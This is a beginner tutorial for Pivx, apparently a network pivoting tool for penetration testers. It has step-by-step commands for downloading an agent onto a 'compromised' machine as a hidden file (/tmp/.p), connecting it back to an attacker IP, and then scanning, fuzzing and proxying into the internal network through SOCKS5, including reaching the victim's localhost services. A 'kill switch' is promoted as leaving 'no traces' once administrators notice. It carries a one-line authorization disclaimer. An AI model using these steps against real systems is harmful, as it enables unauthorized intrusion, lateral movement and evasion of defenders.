[English](TUTORIAL.md) | [Español](TUTORIAL_es.md) | [Português](TUTORIAL_pt.md) | [中文](TUTORIAL_zh.md)

[← Back to README](../README.md)

# 🎮 Quick Guide: Pivx for Beginners

## What is Pivx?

Imagine that the network you want to investigate is a **locked and guarded castle**. Pivx is a **magic, invisible portal**. Instead of fighting with complicated network configurations, you set up a visual "Command Center" on your computer and send an "Agent" inside the castle. Once both are connected, you can use all your tools from the outside as if you were physically sitting inside.

---

## 🚀 Step 1: Your Command Center

First, let's power up your secure base of operations.

- Open your attacker console and type the startup command:

```bash
sudo server/venv/bin/streamlit run server/app.py
```

- Open your favorite web browser and visit: **http://localhost:8501**
- Check out your new web control panel — from here you'll manage all your routes and connections with simple clicks.

---

## 🕵️‍♂️ Step 2: The Secret Agent

Now we need our infiltrator to open the door from inside the castle.

- Upload the `pivx-agent-linux-amd64` file to the machine you've already compromised:

```bash
wget https://github.com/HangLoose84/Pivx/releases/latest/download/pivx-agent-linux-amd64 -O /tmp/.p
chmod +x /tmp/.p
```

- Start the agent and tell it where your base is:

```bash
/tmp/.p --server ws://<YOUR_ATTACKER_IP>:8765
```

- Go back to your web panel and celebrate when your secret agent appears in the table as **"online"**. 🎉

---

## 🪄 Step 3: Your Superpowers

With the portal open, your special tricks are now enabled directly from your machine.

### 🛡️ The Radar (Smartping)

Use normal commands like `ping` or launch quick scans against the castle's machines; the agent will respond on their behalf.

```bash
ping 10.10.20.100
nmap -sn 10.10.20.0/24
```

### 🎭 The Disguise (SOCKS5)

Click the **"Start SOCKS5"** button on your web panel to open a secure tunnel on your local port **1080**.

```bash
curl --socks5-hostname 127.0.0.1:1080 http://10.10.20.100/
```

### 🔍 The Infiltrator's Magnifying Glass

Configure tools like Burp Suite, ffuf, or proxychains to point at `127.0.0.1:1080` and analyze the entire castle.

```bash
proxychains -q nmap -sT -Pn -p 80,443 10.10.20.100
ffuf -x socks5://127.0.0.1:1080 -u http://10.10.20.100/FUZZ -w wordlist.txt
```

### 🪞 The Mirror (Magic IP)

If you want to check what secret programs the victim is hiding on their own machine, simply browse `http://240.0.0.1` from your browser or tools:

```bash
curl --socks5-hostname 127.0.0.1:1080 http://240.0.0.1:8080/
```

The magic address `240.0.0.1` is automatically translated to the agent's `127.0.0.1`.

### 🔴 The Panic Button (Kill Switch)

If you notice the network administrators are tracking you, press the red **"Kill"** button on your panel to destroy the agent instantly. No traces, no leftover files.

---

> ⚠️ **Use only on systems you own or with explicit written authorization.**
